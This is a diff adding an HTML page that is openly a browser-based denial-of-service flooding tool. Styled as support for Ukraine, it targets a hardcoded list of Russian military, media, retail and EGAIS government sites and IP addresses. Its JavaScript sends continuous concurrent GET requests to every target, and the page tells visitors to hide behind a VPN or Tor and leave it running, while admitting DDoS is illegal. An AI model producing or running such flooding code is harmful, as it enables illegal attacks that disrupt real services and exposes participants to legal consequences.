@@ -1,0 +1,592 @@
+<!doctype html>
+<html lang="en">
+<style>
+/* width */
+::-webkit-scrollbar {
+  width: 10px;
+  overflow: auto;
+  height: 0em;
+}
+
+/* Track */
+::-webkit-scrollbar-track {
+  background: #34a8eb;
+}
+
+/* Handle */
+::-webkit-scrollbar-thumb {
+  background: #63c6ff
+  ;
+}
+
+/* Handle on hover */
+::-webkit-scrollbar-thumb:hover {
+  background: yellow;
+}
+.style10 {
+	font-size: 9px;
+	color: #FFFFFF;
+}
+</style>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<title>Day 75 flood</title>
+
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
+    integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js"
+        integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13"
+        crossorigin="anonymous"></script>
+    <script src= 
+"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"> 
+	</script> 
+
+	<script> 
+		/* Add "https://api.ipify.org?format=json" This method uses ipify.org api to get the clients IP Address. 
+		This method is completely free and no limitations of use. */ 
+
+		$.getJSON("https://api.ipify.org?format=json", 
+										function(data) { 
+
+			// userip element is where the IP will be displayed
+			$("#userip").html(data.ip); 
+		}) 
+	</script>
+		<style> 
+		h6 {
+		color:white;
+		}
+	    </style>
+    <style>
+        body {
+            padding: 0;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #FFD600;
+        }
+
+        .title {
+            margin: 3rem auto 3rem auto;
+            text-align: center;
+            color: #005BBC;
+        }
+
+        .intro .howto {
+            background-color: #005BBC;
+        }
+
+        .intro .howto h3 {
+            color: #FFD600;
+            text-align: center;
+            margin-top: 1rem;
+        }
+
+        .intro .howto p {
+            color: white;
+            text-align: justify;
+        }
+
+        .footer {
+            color: #005BBC;
+            text-align: center;
+            margin-top: 2rem;
+        }
+
+        .desc{
+            color:black;
+            padding-top: 2rem;
+            padding-bottom: 2rem;
+            margin: 0 auto;
+            width: 60%;
+        }
+
+        .desc h3 {
+            text-align: center;
+            color: #005BBC;
+        }
+
+        #stats h4 {
+            font-size: 1.1em;
+            text-decoration: underline;
+            color: #005BBC;
+            font-weight: 400;
+        }
+
+        table.status {
+            margin-bottom: 10px;
+        }
+    .style1 {
+	color: #CC0000;
+	font-weight: bold;
+}
+.style6 {color: #FF6262}
+    .style7 {font-size: 0.1px}
+    .style9 {
+	color: #FFD600;
+	font-weight: bold;
+	font-size: 18px;
+}
+    .style10 {font-size: 24px}
+    .style11 {
+	font-size: 16px;
+	color: #FFFFFF;
+}
+    .style13 {
+	margin: 3rem auto 3rem auto;
+	text-align: center;
+	color: #FFD600;
+	font-size: 24px;
+	font-weight: bold;
+}
+    .style14 {color: #FFFFFF}
+    .style15 {color: #FFFF00}
+    .style16 {color: #FF3300}
+    .style17 {color: #FF6633}
+.style21 {color: #B9DCFF}
+    .style22 {color: #ECE3AA}
+	
+table {
+  border-color: #fffd9c;
+}
+    </style>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head>
+
+<body>
+    <div class="modal" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true" data-bs-backdrop="static" data-bs-keyboard="false">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+          <div class="modal-content">
+            <div class="modal-header" style="
+    padding-bottom: 4px;
+    padding-top: 3px;
+">
+              <h5 id="exampleModalLabel" style="
+    margin-bottom: 0px;
+"><span class="modal-title style1">Warning: </span><span class="modal-title style6">Read before you continue. &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="style16">[</span><span class="style17">Day 75</span><span class="style16">]</span></span></h5>
+            </div>
+            <div class="modal-body" style="
+    padding-top: 5px;
+    padding-bottom: 0px;
+">
+              <p style="
+    margin-bottom: 0px;
+">As you're likely already aware, the action of  DoSing or participating in DDoS is illegal, and for good reason.<br>
+Click on continue if you have a VPN Enabled, use a  proxy, use the Tor browser or have your own secure connection and wish to  support Ukraine in taking down Russian and Belarussian propaganda, news,  government, military and banking sites.</p>
+              <hr style="
+    margin-top: 5px;
+    margin-bottom: 5px;
+">
+              <p>This works by sending GET requests to each targeted  website.<br>
+It’s only like opening each website at once on your PC  and<br>
+re-requesting the data over and over, although the data  is not saved or cached, It should be fair to say that your Internet service  Provider (ISP) shouldn’t be anymore bothered about this than they would you  browsing the internet, however some will be funny about it so it's always best  to protect yourself first.</p>
+            </div>
+            <div class="modal-footer">
+              <button type="button" class="btn btn-secondary" onClick="window.location.href='https://www.google.com'">Leave</button>
+              <button type="button" class="btn btn-primary" data-dismiss="exampleModalLabel" onClick="togglePause(); myModal.toggle();">Continue</button>
+            </div>
+          </div>
+        </div>
+</div>
+    <table width="100%" border="0" align="center" bgcolor="#005BBC">
+      <tr>
+        <td bgcolor="#004A9D"><div align="center">
+          <table width="200" border="1" style="border-top-width: 0px;">
+              <tbody><tr>
+                <td><table width="989" border="1" align="left" style="border-top-width: 0px;border-bottom-width: 0px;border-left-width: 0px;border-right-width: 0px;">
+                  <tbody>
+                    <tr>
+                      <td width="239" bgcolor="#005BB7"><div align="right"><span class="style14"><strong>&nbsp;Info:</strong> Your Public IP Address is:&nbsp; </span></div></td>
+                      <td width="175" bgcolor="#005BB7"><h6 id="userip" style="margin-bottom: 0px;">Loading..</h6></td>
+                      <td width="553" bgcolor="#005BB7"><div align="right"><span class="style21">For privacy, download the Tor Browser:</span>&nbsp;<a href="https://www.torproject.org/download/" target="_blank" class="style22" rel="nofollow">https://www.torproject.org/download/</a>&nbsp;&nbsp;&nbsp;</div></td>
+                    </tr>
+                  </tbody>
+                </table></td>
+              </tr>
+            </tbody></table>
+          <p class="style13" style="margin-top: 0px;margin-bottom: 0px;">          Propaganda http(s) flood  for <span class="style15">Day 75 <span style="font-size: 12px"><span style="font-size: 18px; font-weight: normal;"><em>+</em></span><em> &quot;EGAIS&quot;</em></span> </span>using targets from the IT Army of Ukraine.</u></p>
+        </div></td>
+      </tr>
+      <tr>
+        <td bgcolor="#0057B7"><div align="center" class="style9 style10">
+          <h3><u>Infomation about this tool.</u></h3>
+        </div></td>
+      </tr>
+      <tr>
+        <td><table width="90%" border="0" align="center">
+          <tr>
+            <td><p class="style11">This tool is hosted via GitHub Pages, You can download it for local use and customization <a href="https://raw.githubusercontent.com/helpukr/helpukr.github.io/main/day75.htm" target="_blank" class="style15">here</a> We'll aim to create a new page for each day a new set of targets is released in the Ukrainian IT Army's telegram servers..</p>
+              <p class="style11">The "official" news in the Russian federation is all fake and need to be shut down, we need as many people as possible to help in any way you can, and just a tiny 1kbps of data could be the edge needed to take down a server. </p>
+              <p class="style11">Just open this page and leave it running on your devices as long as possible, it will flood there web-sites and together we can pose a huge load on their infrastructure.</p>
+            <p class="style11"> <strong>TIP:</strong> To see what
+			’s happening in more detail, open the developer console (F12) and select the Network Tab. If you have an older device and find the page crashes after so long, you can stop recording network log (ctrl+e from developer console).</p>
+            <hr style="
+    margin-top: 5px;
+    margin-bottom: 5px;
+	color: #FFFFFF
+"></td>
+          </tr>
+        </table>
+          <table width="50%" border="0" align="center">
+            <tr>
+              <td><h3 align="center" class="style14">Session Status</h3>
+                <p align="center" class="style14" style="
+    margin-bottom: 0px;
+    padding-bottom: 2px;
+">Below is the number of error responses and fragmented data from each GET request, individual responses for each targeted website are shown below detailing both requests and responses.<br>
+                  Some failure to fetch is normal! That means their servers are overloaded and dropping packets - which is the goal! However all of them dropping likely indicates they have blocked the IP you're using and you should switch to a new one.</p>
+                <p align="center" class="style7" style="
+    margin-bottom: 0px;
+">Total number of requests: <span id="totalrequests">0</span></p></td>
+            </tr>
+          </table>          </td>
+      </tr>
+    </table>
+    <div class="desc text-center" style="
+    padding-top: 4px;
+">
+      <p>Total overloaded / dropping packets: <span id="totalerrors"><em>waiting..</em></span></p>
+    <button type="button" class="btn btn-primary" onClick="togglePause();" style="
+    padding-left: 32px;
+    padding-right: 32px;
+    padding-top: 8px;
+    padding-bottom: 8px;
+">Resume</button>
+</div>
+
+    <div id="stats" class="container">
+        <div class="row">
+        </div>
+    </div>
+
+    <p class="footer">Reformated from https://stop-russian-desinformation.near.page | Forked from infoek.cz/ddos.html</p>
+
+    <script>        
+        // target list
+        var urls = [
+            'https://mil.ru/',
+            'https://recrut.mil.ru/',
+            'https://contract.mil.ru/enlistment_contract/info.htm',
+            'https://question.mil.ru/',
+            'https://doc.mil.ru/',
+            'https://archive.mil.ru/',
+            'https://function.mil.ru',
+            'https://ens.mil.ru',
+            'https://sc.mil.ru',
+            'https://structure.mil.ru',
+            'https://economy.mil.ru/economy/about.htm',
+            'https://heraldy.mil.ru',
+            'http://87.242.66.56:80',
+            'https://87.242.66.56:443',
+            'https://letters.mil.ru/electronic_reception.htm',
+            'https://lkg.mil.ru/',
+            'https://cabinet.mil.ru/',
+            'http://212.164.137.229:80',
+            'https://212.164.137.229:443',
+            'http://212.164.137.231:80',
+            'https://212.164.137.231:443',
+            'http://212.164.137.233:80',
+            'https://212.164.137.233:443',
+            'https://yunarmy.ru/',
+            'http://93.158.192.155:80',
+            'https://93.158.192.155:443',
+            'http://www.dosaaf.ru/',
+            'http://195.208.1.100:80',
+            'https://195.208.1.100:443',
+            'https://bbratstvo.com/',
+            'http://92.53.124.242:80',
+            'https://92.53.124.242:443',
+            'https://tsargrad.tv/shows',
+            'http://84.201.189.90:80',
+            'https://84.201.189.90:443',
+            'https://77.238.100.197:25',
+            'http://ns1.tsargrad.tv/',
+            'https://77.238.100.195:25',
+            'http://77.238.100.195:80',
+            'https://188.64.160.163:25',
+            'http://188.64.160.163 :80',
+            'https://mirtesen.tsargrad.tv',
+            'http://ns2.tsargrad.tv/',
+            'http://95.131.27.119:80',
+            'https://95.131.27.119:443',
+            'https://cloud.tsargrad.tv/nextcloud/index.php/login',
+            'http://188.64.160.172:80',
+            'https://188.64.160.172:443',
+            'https://ptoday.ru/blog/pozdravlyat-s-dnem-pobedy-krasivymi-pozdravleniyami-budut-rossiyane-9-maya-2022-goda/',
+            'https://134.0.118.81:25',
+            'http://134.0.118.81:80',
+            'https://134.0.118.81:110',
+            'https://134.0.118.81:143',
+            'https://134.0.118.81:443',
+            'https://134.0.118.81:465',
+            'https://134.0.118.81:587',
+            'https://134.0.118.81:993',
+            'https://134.0.118.81:995',
+            'https://134.0.118.81:1500',
+            'https://www.polkrf.ru/news/',
+            'http://185.178.208.177:80',
+            'https://185.178.208.177:443',
+            'https://2022.polkrf.ru/',
+            'http://178.248.239.66:80',
+            'https://178.248.239.66:443',
+            'https://www.moypolk.ru/',
+            'http://178.248.239.149:80',
+            'https://178.248.239.149:443',
+            'https://pamyat-naroda.ru/heroes/?static_hash=edfafc8ef83c2183ff642f0dee196041v2',
+            'http://185.169.155.245:80',
+            'https://185.169.155.245:443',
+            'https://foto.pamyat-naroda.ru/',
+            'http://185.169.155.246:80',
+            'https://185.169.155.246:443',
+            'https://more.tv/',
+            'http://185.71.67.105:80',
+            'https://185.71.67.105:443',
+            'https://osiris.preprod.more.tv/',
+            'https://rendertron.preprod.more.tv',
+            'https://gitlab-exporter.preprod.more.tv',
+            'https://dagon.preprod.more.tv',
+            'http://94.140.201.116:80',
+            'https://94.140.201.116:443',
+            'https://static.more.tv/',
+            'http://94.140.200.247:80',
+            'https://94.140.200.247:443',
+            'http://94.140.201.50:80',
+            'https://94.140.201.50:443',
+            'https://moretv-sport.preprod.more.tv/',
+            'https://billing-api-test.preprod.more.tv/',
+            'https://rc.more.tv/home',
+            'http://94.140.201.135:80',
+            'https://94.140.201.135:443',
+            'https://its.more.tv/the_telki',
+            'https://okko.tv',
+            'http://185.169.155.118:80',
+            'https://185.169.155.118:443',
+            'https://www.promo.okko.tv',
+            'https://cabinet.okko.tv/login',
+            'https://151.236.80.51:443',
+            'https://www.agent.okko.tv/',
+            'https://185.129.100.112:443',
+            'http://185.129.100.112:80',
+            'https://agents.okko.tv',
+            'https://premiere.okko.tv/',
+            'https://show.okko.tv',
+            'http://178.18.218.26:80',
+            'https://178.18.218.26:443',
+            'https://mimimi.okko.team/',
+            'https://151.236.80.50:443',
+            'https://pobeda.okko.tv',
+            'http://185.169.155.116:80',
+            'https://185.169.155.116:443',
+            'https://www.amediateka.ru',
+            'http://212.193.156.175:80',
+            'https://212.193.156.175:443',
+            'http://212.193.146.216:80',
+            'https://212.193.146.216:443',
+            'http://62.76.27.135:80',
+            'https://62.76.27.135:443',
+            'https://major.amediateka.ru/',
+            'http://62.76.27.135:80',
+            'https://62.76.27.135:443',
+            'https://mt.bel.ru/blog/latest',
+            'https://95.131.27.119:25',
+            'http://95.131.27.119:80',
+            'https://95.131.27.119:443',
+            'http://belgorodtv.ru/?page_id=127369',
+            'https://93.171.213.161:25',
+            'http://93.171.213.161:80',
+            'http://93.171.213.161:88',
+            'https://93.171.213.161:110',
+            'https://93.171.213.161:143',
+            'https://93.171.213.161:465',
+            'https://93.171.213.161:993',
+            'https://93.171.213.161:995',
+            'https://93.171.213.161:8000',
+            'https://voenpro.ru/voentorg/futbolka-spetsoperasia-z',
+            'http://185.129.103.95:80',
+            'https://185.129.103.95:443',
+            'http://176.99.4.106:80',
+            'https://176.99.4.106:443',
+            'https://176.99.4.106:8090',
+            'https://9may.shop/index.php?route=cat/cat',
+            'http://92.53.96.174:80',
+            'https://92.53.96.174:443',
+            'https://armrus.ru/katalog/kollekciya/9-maya',
+            'https://185.253.34.99:25',
+            'http://185.253.34.99:80',
+            'https://185.253.34.99:110',
+            'https://185.253.34.99:143',
+            'https://185.253.34.99:443',
+            'https://185.253.34.99:465',
+            'https://185.253.34.99:587',
+            'https://185.253.34.99:993',
+            'https://185.253.34.99:995',
+            'https://185.253.34.99:1500',
+            'https://www.vsemayki.ru/catalog/I_am_Russian',
+            'http://178.248.232.212:80',
+            'https://178.248.232.212:443',
+            'https://keltr.ru/futbolki/z-17869/',
+            'http://95.163.119.211:80',
+            'https://95.163.119.211:443',
+            'https://fabricafutbolok.ru/products/z-futbolka/',
+            'http://87.236.16.248:80',
+            'https://87.236.16.248:443',
+            'https://87.236.16.248:',
+        // EGAIS BELOW
+            'https://documents-utm.egais.ru',
+            'https://cheques-utm.egais.ru',
+            'https://queries-utm.egais.ru',
+            'http://212.164.137.90:80',
+            'https://212.164.137.90:443',
+            'http://212.164.137.248:80',
+            'https://212.164.137.248:443',
+            'http://212.164.137.253:80',
+            'https://212.164.137.253:443',
+            'https://egais.ru',
+            'https://service.egais.ru',
+            'https://check.egais.ru',
+            'http://212.164.137.246:80',
+            'https://212.164.137.246:443',
+            'http://146.120.90.19:80',
+            'https://146.120.90.19:443',
+            'https://146.120.90.28:443',
+            'https://146.120.90.29:443',
+            'https://146.120.90.30:443',
+            'https://146.120.90.34:443',
+            'http://146.120.90.38:80',
+            'https://146.120.90.38:443',
+            'https://146.120.90.41:8080',
+            'https://146.120.90.41:8443',
+            'https://146.120.90.42:8080',
+            'https://146.120.90.42:8443',
+            'https://146.120.90.52:4443',
+            'https://146.120.90.52:8080',
+            'https://146.120.90.52:8443',
+            'https://146.120.90.62:443',
+            'https://146.120.90.72:443',
+            'https://146.120.90.73:443',
+            'https://146.120.90.74:443',
+            'https://146.120.90.169:8443',
+            'https://146.120.90.197:6443',
+            'https://146.120.90.245:443',
+            'https://146.120.90.246:443',
+            'https://146.120.90.247:443',
+        ];
+
+        // initialize variables
+        var targets = urls.reduce((o, key) => ({ ...o, [key]: {number_of_requests: 0, number_of_errored_responses: 0}}), {})
+        var statRow = document.querySelector("#stats > .row");
+        var myModal = new bootstrap.Modal(document.getElementById('exampleModal'), {});
+        var CONCURRENCY_LIMIT = 200;
+        var queue = [];
+        var attack = false;
+        var totalrequests = 0;
+        var totalerrors = 0;
+
+        function togglePause () {
+            if (attack) {
+                attack = false;
+                document.querySelector("div.desc .btn").innerText = "Resume";
+            } else {
+                attack = true;
+                document.querySelector("div.desc .btn").innerText = "Pause";
+                for (var i=0; i<urls.length; i++) {
+                    flood(i);
+                }
+            }
+        }
+
+        async function fetchWithTimeout(resource, options) {
+            const controller = new AbortController();
+            const id = setTimeout(() => controller.abort(), options.timeout);
+            return fetch(resource, {
+                signal: controller.signal,
+                mode: 'no-cors'
+            }).then((response) => {
+                clearTimeout(id);
+                return response;
+            }).catch((error) => {
+                clearTimeout(id);
+                throw error;
+            });
+        }
+
+        async function sleep(ms) {
+            return new Promise(r => setTimeout(r, ms));
+        }         
+
+        async function flood(n) {
+            const url = urls[n];
+            const target = targets[url];
+
+            while (attack) {
+                if (queue.length > CONCURRENCY_LIMIT) {
+                    await queue.shift();
+                }
+                queue.push(
+                    fetchWithTimeout(url, { timeout: 2000 })
+                        .catch((error) => {
+                            if (error.code === 20 /* ABORT */) {
+                                return;
+                            }
+                            target.number_of_errored_responses++;
+                            target.error_message = error.message;
+                            totalerrors++;
+                        })
+                        .then((response) => {
+                            if (response && !response.ok) {
+                                target.number_of_errored_responses++;
+                                target.error_message = response.statusText;
+                                totalerrors++;
+                            }
+                            target.number_of_requests++;
+                        })
+                        .finally(() => updateTargetDisplay(n))
+                );
+
+                await sleep(1);
+            }
+        }
+
+        // Update data for target n
+        function updateTargetDisplay(n) {
+            var url = urls[n];
+            var {number_of_requests, number_of_errored_responses} = targets[url];
+            var requests_cell = document.querySelector(`#target${n} .requests`);
+            var errors_cell = document.querySelector(`#target${n} .errors`);
+            requests_cell.innerText = number_of_requests;
+            errors_cell.innerText = number_of_errored_responses;
+            document.querySelector("#totalrequests").innerText = totalrequests;
+            document.querySelector("#totalerrors").innerText = totalerrors;
+        }
+
+        // Shuffle array order before starting
+        for (let i = urls.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [urls[i], urls[j]] = [urls[j], urls[i]];
+        }
+
+        // Create div for each target
+        for (var i=0; i<urls.length; i++) {
+            statRow.innerHTML += `
+                <div class="col-lg-3 col-md-4 col-sm-6" id="target${i}">
+                    <h4>${urls[i]}</h4>
+                    <table class='status'>
+                        <tr><td>requests:</td><td class="requests">0</td></tr>
+                        </tr><td>errors:</td><td class="errors">0</td></tr>
+                    </table>
+                </div>
+            `;
+        }
+
+        // Show warning window
+        myModal.toggle();
+
+    
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-85513613-1');
+</script>
+</html>
